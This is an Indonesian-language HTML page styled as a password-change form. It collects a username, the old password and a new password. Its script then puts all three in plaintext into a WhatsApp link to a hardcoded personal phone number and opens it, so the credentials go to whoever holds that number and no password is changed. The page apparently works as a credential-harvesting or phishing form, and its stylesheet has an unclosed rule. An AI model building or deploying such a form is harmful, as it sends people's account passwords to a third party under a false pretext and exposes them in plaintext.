<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulir Ubah Password</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .container label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        .container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #218838;
        }
        .container .back-link {
            margin-top: 10px;
            display: inline-block;
            text-decoration: none;
            color: #007bff;
        }
		.button {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 20px;
            font-size: 16px;
            color: #fff;
            background-color: #FF0000;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: #0056b3;
    </style>
</head>
<body>
    <div class="container">
        <h2>Formulir Ubah Password</h2>
        <form id="passwordForm" onsubmit="submitForm(); return false;">
            <label for="username">Username Akun:</label>
            <input type="text" id="username" name="username" required>
            
            <label for="oldPassword">Password Lama:</label>
            <input type="password" id="oldPassword" name="oldPassword" required>
            
            <label for="newPassword">Password Baru:</label>
            <input type="password" id="newPassword" name="newPassword" required>
            
            <button type="submit">Kirim</button>
        </form>
        <a href="index.html" class="button">Kembali</a>
    </div>

    <script>
        function submitForm() {
            // Menampilkan popup konfirmasi
            if (confirm("Apakah Anda yakin ingin mengirim permintaan perubahan password?")) {
                // Jika pengguna menekan OK, kirim permintaan perubahan password
                sendToWhatsApp();
            }
        }

        function sendToWhatsApp() {
            var username = document.getElementById("username").value;
            var oldPassword = document.getElementById("oldPassword").value;
            var newPassword = document.getElementById("newPassword").value;
            var phoneNumber = "6283166570663"; // Prefix Indonesia: +62
            var message = `ubah password akun %0A*Username*: ${username}%0A*Password Lama*: ${oldPassword}%0A*Password Baru*: ${newPassword}`;
            var url = `https://wa.me/${phoneNumber}?text=${message}`;
            window.open(url, '_blank');
        }
    </script>
</body>
</html>
